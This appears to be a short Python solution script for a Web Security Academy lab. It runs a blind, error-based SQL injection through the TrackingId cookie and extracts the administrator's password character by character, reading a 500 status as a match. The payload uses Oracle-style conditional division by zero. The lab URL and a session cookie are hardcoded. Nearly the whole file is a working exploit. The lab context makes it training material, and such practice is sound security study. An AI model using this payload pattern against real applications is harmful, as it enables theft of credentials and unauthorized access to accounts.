import requests
password=''
url="https://0ab200ee039d3bd6805de98d008b00d7.web-security-academy.net/filter?category=Tech+gifts"
cookies={"TrackingId":"x","session":"TNPoxvfqqXH5uAYQeVnISg3f3viMi9qA"}
for i in range(20,21):
    for j in range(32,127):
        payload=f"5p7w68TVr9rxsJ9l'||(SELECT CASE WHEN SUBSTR(password,{i},1)=CHR({j}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        cookies["TrackingId"]=payload
        response=requests.get(url,cookies=cookies)
        if response.status_code==500:
            password+=chr(j)
            print(f"password ---> {password}")
            break
        else:
            pass 